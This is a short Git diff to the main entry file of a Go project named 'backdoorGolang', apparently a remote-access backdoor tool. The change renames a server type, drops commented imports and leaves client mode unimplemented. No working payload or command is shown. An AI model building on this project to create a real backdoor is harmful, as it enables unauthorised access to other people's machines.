@@ -5,8 +5,6 @@ import (
 
 	"github.com/pilebones/backdoorGolang/core/cli"
 	"github.com/pilebones/backdoorGolang/core/socket/server"
-	// "github.com/pilebones/backdoorGolang/core/socket/client"
-	// "github.com/pilebones/backdoorGolang/core/socket"
 )
 
 func main() {
@@ -22,10 +20,12 @@ func main() {
 	if context.UseListenMode { // Server mode
 		fmt.Printf("Listening on %s:%d\n", context.Target.Host, context.Target.Port)
 		// var server server.ServerProvider = server.Create(context.(socket.SocketWrapper))
-		var server server.ServerProvider = server.Create(context.Target, context.UseDebugMode)
+		var server server.Server = server.Create(context.Target, context.UseDebugMode)
 		server.Start()
 
 	} else { // Client mode
+		// var client client.Client = client.Create(context.Target, context.UseDebugMode)
+
 		fmt.Printf("Init client mode : feature not fully implemented yet work in progress\n")
 		// var clientProvider client.ClientProvider = client.CreateClient(context.Host, context.Port, context.UseDebugMode)
 	}
